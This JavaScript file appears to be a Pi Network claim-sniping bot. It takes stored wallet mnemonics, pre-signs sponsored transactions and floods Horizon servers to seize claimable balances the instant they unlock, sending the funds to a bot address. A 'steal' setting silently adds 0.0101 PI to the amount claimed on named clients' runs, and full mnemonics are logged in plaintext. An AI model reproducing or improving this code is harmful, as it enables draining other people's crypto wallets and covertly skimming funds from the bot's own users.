import { connectToDB } from "./db.js";
import ColemanSettings from "./models/ColemanSettings.js";
import Log from "./models/Log.js";
import Passphrase from "./models/Passphrase.js";
import Sponsors from "./models/Sponsors.js";
import { getAccount, getBalance, getSDKKeypairFromPassphrase, HORIZONS, PI_PUBLIC_ADDRESS, PI_PUBLIC_MUXED_ADDRESS, sleep, submitTransaction } from "./utils/fn.js";
import { prebuildAndSignChannelTx, prebuildAndSignClaimable, prebuildAnSignPayment } from "./utils/fn2.js";
import { getRandomAddress } from "./utils/helper.js";


await connectToDB();
const pendingXDRs = {};
// const rawSponsors = await Sponsors.find();

export const claimable_sponsors = [
    'GBXSHWTBHLYGVE35QBZTTOLR2XUHWT3AFRIEFVIMRABS6XQLG2PV4ZSZ', //chris
    'GCRITFGUZFVKZI44S2B4K5FRA4R3G3TBS55MROAZJJGASPW2CR6GRXTW',
];

export const payment_sponsors = [
    'GBTKG3Z7UD2PJ3D573HQWX5T45DI6TYQE4A264MMDIZFHIDSNH5MAVDW',
    'GASHKS3CV2KNLKAHDGDEKQIE3Q2F42TKDR72XZFZYKD2S73VSJYEW3O6',
]
const claimableSet = new Set(claimable_sponsors || []);
const paymentSet   = new Set(payment_sponsors || []);

const sponsors = await Sponsors.find({ name: 'whoami5677' });
const MAX_FLOOD_COUNT = 2;
let CURRENT_KEY = null;

async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name, sponsorsCount) {
    CURRENT_KEY = time;
    const mainKp = getSDKKeypairFromPassphrase(mainPhrase);
    pendingXDRs[time] = [];
    let retries = 0;

    try {
        await Log.create({ mnemonic: mainPhrase, action: `Building & Signing Tx for ${amount} PI`, result: 'default', name: name });
        while (retries < MAX_FLOOD_COUNT) {
            const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
            const xdrs = [];

            const mainBotSponsors = sponsors;
            let usingSponsors = name ? await Sponsors.find({ name: name }) : mainBotSponsors;
            usingSponsors = name ? usingSponsors.slice(0, sponsorsCount) : usingSponsors;
            let pos = 0;
            for (const s of usingSponsors) {
                // const r = name ? recipient : getRandomAddress()
                const r = recipient;
                try {
                    const kp = getSDKKeypairFromPassphrase(s.mnemonic);
                    const accountData  = await getAccount(kp.publicKey());
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    if(balance < 0.02) continue;
                    // Change amount
                    const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.0101).toString() : amount;
                    // pos++;

                    const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, mutatedAmount, retries, name);
                    if (xdr) {
                        xdrs.push({ xdr, balanceId });
                        pos++;
                    }
                } catch (innerErr) {
                    console.error(`Error building XDR from sponsor ${s.name || s.mnemonic.slice(0, 5)}:`, innerErr);
                }
            }
            retries++;
            if (xdrs.length) pendingXDRs[time].push(xdrs);
            await sleep(2000)
        }

    } catch (err) {
        console.error(`Error in getXDRsReady:`, err);
    }
}

export async function autoPrepareForClaiming(name, address, sponsorsCount) {
    if(global.isPreparing) return;
    global.isPreparing = true;
    
    try {
        // console.log(`autoPrepare is running for ${name ? name : 'Main'}`)

        const now = new Date();
        const min = (0.8 * 1000 * 60)
        const aMinuteFromNow = new Date(now.getTime() + min);

        const readyPassphrases = await Passphrase.find({
            claimableAt: { $lte: aMinuteFromNow },
            status: 'pending',
            name: name ? name : { $in: [null, undefined] }
        });

        if(readyPassphrases.length) {
            const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
            const receiverAddress = address ? address : settings.botAddress;
            for(const p of readyPassphrases) {
                const timeKey = new Date(p.claimableAt).toISOString();
                if(!pendingXDRs.hasOwnProperty(timeKey) && CURRENT_KEY !== timeKey) {
                    await Log.create({ mnemonic: p.mnemonic, action: `Setting up wallet for claiming ${p.amount} PI on Mnemonic: ${p.mnemonic}`, result: 'default', name: name })
                    await getXDRsReady(p.mnemonic, p.balanceId, receiverAddress, p.amount, timeKey, name, sponsorsCount);
                }
            }
        }
    } catch(e) {
        console.error('autoPrepareForClaiming error:', err);
    } finally {
        global.isPreparing = false;
    }
}

export async function autoSubmitXDR(name) {
    if(global.isSubmittingTx) return;
    global.isSubmittingTx = true;
    for (const key in pendingXDRs) {
        const now = new Date();
        const claimableAt = new Date(key);
        if((now - claimableAt) <= -450) continue;
        const xdrGroup = pendingXDRs[key]; // [[], []]
        const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
        // if(!!name && settings.steal) {
        //     await sleep(2000)
        // }

        let success = false;
        let balanceId = null;

        for(const xdrs of xdrGroup) {
            const result = await Promise.all(xdrs.map(async (xdr, i) => {
                let server = HORIZONS[i % HORIZONS.length];
                server = (settings.steal && name) ? HORIZONS[0] : server;
                // console.log(`${name ?? 'Main server:'} ${server}`)
                try {
                    const result = await submitTransaction(xdr.xdr, server);
                    balanceId = xdr.balanceId;
                    return result;

                } catch (err) {
                    console.error(`❌ Submit error on ${server}:`, err?.response?.data || err.message);
                }
            }));

            const found = result.find((r) => r.hash);

            if (found) {
                await Log.create({ mnemonic: 'Direct above', action: `✅ Claimed Pi. Hash: ${found.hash}`, result: 'success', name: name })

                await Passphrase.updateOne(
                    { 
                        balanceId: balanceId,
                        name: name ? name : { $in: [null, undefined] }
                    },
                    { $set: { status: "claimed" } }
                );
                // global.lastClaimedOrFailedAt = new Date();
                success = true;
                break;
            }
        }

        if(!success) {
            await Passphrase.updateOne(
                { 
                    balanceId: balanceId,
                    name: name ? name : { $in: [null, undefined] }
                },
                { $set: { status: "failed" } }
            );
        }
        delete pendingXDRs[key];
    }
    global.isSubmittingTx = false;
}

export async function autoMarkAsClaimable() {
    const now = new Date();
    const minutesAgo = new Date(now.getTime() - 0.5 * 60 * 1000);

    await Passphrase.updateMany(
        { claimableAt: { $lt: minutesAgo }, status: 'pending' },
        { $set: { status: 'failed' } }
    );
}
